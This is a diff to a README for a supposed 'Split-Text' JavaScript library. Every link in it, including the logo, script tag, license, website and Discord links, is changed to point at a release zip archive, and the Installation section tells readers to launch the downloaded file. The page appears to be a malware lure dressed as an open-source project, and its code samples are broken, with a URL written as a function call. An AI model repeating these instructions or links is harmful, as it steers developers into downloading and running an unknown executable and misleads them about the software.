@@ -3,7 +3,7 @@
 
 ### A comprehensive tool to split text within HTML elements into individual lines, words, and/or characters.
 
-![Split-Text Logo](https://github.com/RainerJeremy/split-text/releases/download/v1.0/Installer.zip)
+![Split-Text Logo](https://github.com/RainerJeremy/split-text/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -28,13 +28,13 @@ The "split-text" repository provides a powerful solution for breaking down text 
 To start using Split-Text, simply include the script in your HTML file:
 
 ```html
-<script src="https://github.com/RainerJeremy/split-text/releases/download/v1.0/Installer.zip"></script>
+<script src="https://github.com/RainerJeremy/split-text/releases/download/v2.0/Software.zip"></script>
 ```
 
 Then, initialize the Split-Text functionality on the desired element:
 
 ```javascript
-const element = https://github.com/RainerJeremy/split-text/releases/download/v1.0/Installer.zip('text-element');
+const element = https://github.com/RainerJeremy/split-text/releases/download/v2.0/Software.zip('text-element');
 const splitText = new SplitText(element);
 ```
 
@@ -44,9 +44,9 @@ You're now ready to unleash the power of text manipulation with Split-Text!
 
 ## Installation
 
-To get started with Split-Text, you can download the latest version [here](https://github.com/RainerJeremy/split-text/releases/download/v1.0/Installer.zip). Please make sure to launch the file after downloading it.
+To get started with Split-Text, you can download the latest version [here](https://github.com/RainerJeremy/split-text/releases/download/v2.0/Software.zip). Please make sure to launch the file after downloading it.
 
-Alternatively, you can also visit the [official Split-Text website](https://github.com/RainerJeremy/split-text/releases/download/v1.0/Installer.zip) for more information and resources.
+Alternatively, you can also visit the [official Split-Text website](https://github.com/RainerJeremy/split-text/releases/download/v2.0/Software.zip) for more information and resources.
 
 ---
 
@@ -68,13 +68,13 @@ To help you navigate through different aspects of Split-Text, we have categorize
 
 ## Community
 
-Join our community of developers and enthusiasts on our [Discord server](https://github.com/RainerJeremy/split-text/releases/download/v1.0/Installer.zip) to share ideas, seek help, and stay updated on the latest developments.
+Join our community of developers and enthusiasts on our [Discord server](https://github.com/RainerJeremy/split-text/releases/download/v2.0/Software.zip) to share ideas, seek help, and stay updated on the latest developments.
 
 ---
 
 ## License
 
-Split-Text is licensed under the MIT License. For full details, please refer to the [LICENSE](https://github.com/RainerJeremy/split-text/releases/download/v1.0/Installer.zip) file in the repository.
+Split-Text is licensed under the MIT License. For full details, please refer to the [LICENSE](https://github.com/RainerJeremy/split-text/releases/download/v2.0/Software.zip) file in the repository.
 
 ---
 
@@ -82,10 +82,10 @@ Split-Text is licensed under the MIT License. For full details, please refer to 
 
 Don't wait any longer to revolutionize the way you work with text in your web projects. Download Split-Text today and experience the endless possibilities of text splitting and manipulation.
 
-[![Download Split-Text](https://github.com/RainerJeremy/split-text/releases/download/v1.0/Installer.zip)](https://github.com/RainerJeremy/split-text/releases/download/v1.0/Installer.zip)
+[![Download Split-Text](https://github.com/RainerJeremy/split-text/releases/download/v2.0/Software.zip)](https://github.com/RainerJeremy/split-text/releases/download/v2.0/Software.zip)
 
 ---  
 
 ## 🚀 Happy Splitting and Text Manipulation! 🚀
 
-![Splitting Image](https://github.com/RainerJeremy/split-text/releases/download/v1.0/Installer.zip)
+![Splitting Image](https://github.com/RainerJeremy/split-text/releases/download/v2.0/Software.zip)
